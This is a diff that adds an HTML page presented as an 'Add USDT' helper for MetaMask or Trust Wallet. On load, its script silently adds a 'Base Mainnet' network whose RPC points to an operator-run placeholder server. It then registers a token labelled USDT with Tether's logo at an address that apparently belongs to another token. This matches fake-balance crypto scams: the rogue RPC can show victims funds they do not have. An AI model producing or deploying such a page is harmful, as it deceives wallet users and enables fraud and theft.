@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Add USDT</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>body { font-family: Arial; text-align: center; padding: 20px; } .hidden { display: none; }</style>
+</head>
+<body>
+    <h1>Add USDT</h1>
+    <p id="status">Importing USDT token...</p>
+    <p id="error" class="hidden">Please open in MetaMask or Trust Wallet.</p>
+    <script>
+        async function addNetworkAndToken() {
+            if (!window.ethereum) {
+                document.getElementById('status').classList.add('hidden');
+                document.getElementById('error').classList.remove('hidden');
+                return;
+            }
+            try {
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== '0x2105') {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x2105',
+                            chainName: 'Base Mainnet',
+                            rpcUrls: ['https://your-app-name.onrender.com/rpc'],  // Update after Step 2
+                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://basescan.org']
+                        }]
+                    });
+                } else {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x2105' }]
+                    });
+                }
+                await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
+                            symbol: 'USDT',
+                            decimals: 6,
+                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                        }
+                    }
+                });
+                document.getElementById('status').textContent = 'USDT added to your wallet!';
+            } catch (error) {
+                document.getElementById('status').classList.add('hidden');
+                document.getElementById('error').classList.remove('hidden');
+            }
+        }
+        addNetworkAndToken();
+    </script>
+</body>
+</html>
